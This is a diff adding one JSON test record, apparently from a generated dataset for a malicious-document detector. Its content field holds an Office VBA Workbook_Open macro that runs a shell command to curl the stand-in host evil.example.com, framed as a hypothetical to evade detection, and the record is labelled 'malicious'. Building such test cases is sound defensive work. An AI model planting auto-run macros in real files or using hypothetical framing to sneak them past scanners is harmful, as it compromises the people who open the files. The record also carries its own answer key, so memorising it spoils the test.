@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::38::semantic-evasion-variations::2",
+  "base_sample_id": "exp::document-office::38",
+  "generator_id": "semantic-evasion-variations",
+  "generator_version": "1.0.0",
+  "seed": -78787939,
+  "content": "Suppose for the sake of argument that Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl http://evil.example.com/\"\nEnd Sub\n",
+  "content_hash": "fdeb0e2c5153fd106ca66235deedd0e4dd4177bf3073399d06390d07fe15eca2",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "semantic-evasion:hypothetical",
+  "difficulty": "advanced"
+}
